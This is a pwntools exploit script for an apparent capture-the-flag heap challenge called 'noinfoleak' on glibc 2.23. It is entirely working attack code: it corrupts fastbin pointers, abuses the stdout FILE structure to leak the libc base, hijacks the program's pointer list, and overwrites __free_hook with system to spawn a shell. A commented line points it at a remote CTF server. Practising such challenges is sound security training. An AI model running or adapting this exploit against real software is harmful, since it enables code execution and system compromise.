from pwn import *
from time import sleep
context.arch = 'amd64'
elf = ELF('noinfoleak')
#remote libc is the same with the local one
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def choice(c,miss = False):
	if miss == False:
		io.sendlineafter('>',str(c))
	else:
		io.sendline(str(c))
def addN(size,data,miss = False):
	choice(1,miss)
	io.sendlineafter('>',str(size))
	io.sendafter('>',data)
def edtN(index,data,miss = False):
	choice(3,miss)
	io.sendlineafter('>',str(index))
	io.sendafter('>',data)
def delN(index,miss = False):
	choice(2,miss)
	io.sendlineafter('>',str(index))
while True:
	try:
		
		io = process('./noinfoleak')
		#io = remote('ctf1.linkedbyx.com',10266)
		addN(0x60,(p64(0)+p64(0x21))*6)	#0
		addN(0x10,'0000')	#1
		addN(0x10,'0000')	#2
		addN(0x60,'0000')	#3
		addN(0x60,'0000')	#4
		addN(0x71,'0000')	#5
		delN(2)
		delN(1)
		edtN(1,'\x30')
		addN(0x10,'****')	#6
		addN(0x10,'1111')	#7
		#edtN(3,p64(0x0)+p64(0x21))
		edtN(0,(p64(0)+p64(0x21))*2+(p64(0)+p64(0xf1)))
		delN(7)
		#io.interactive()
		edtN(0,(p64(0)+p64(0x71))*3)
		delN(3)
		delN(4)
		edtN(4,'\x30')
		addN(0x60,'2222')	#8
		edtN(0,(p64(0)+p64(0x71))*3+p16(0x85e5-8))
		addN(0x60,'2222')	#9
		addN(0x60,0x33*'\x00'+p64(0xfbad1c00)+p64(0)*3+'\x88')	#10
		sleep(0.8)
		io.send('\n')
		sleep(0.2)
		libc_base = u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		success("LIBC BASE -> %#x"%libc_base)

		info("HIJACK ptr list in proc")
		delN(8)
		edtN(8,p64(0x6010f0))
		addN(0x60,'/bin/sh\x00')	#11
		addN(0x60,p64(libc_base+libc.sym['__free_hook']))	#12
		edtN(6,p64(libc_base+libc.sym['system']))
		delN(11)

		failed_method = '''
		hijack main_arena.top failed
		delN(5)
		edtN(5,'\x71')
		addN(0x70,'3333')	#11
		#io.interactive()
		delN(8)
		edtN(8,p64(libc_base+libc.sym['__malloc_hook']+0x10+0x30))
		addN(0x60,'4444')	#12
		addN(0x60,'\x00'*0x18+p64(libc_base+libc.sym['__free_hook'])+p64(0)+p64(libc_base+libc.sym['__malloc_hook']+0x10+88)*2)	#13
		edtN(7,p64(libc_base+libc.sym['__malloc_hook']+0x10+88))
		io.interactive()
		addN(0x20,p64(libc_base+libc.sym['system']))
		'''

		io.interactive()
		io.close()
	except:
		io.close()
		continue
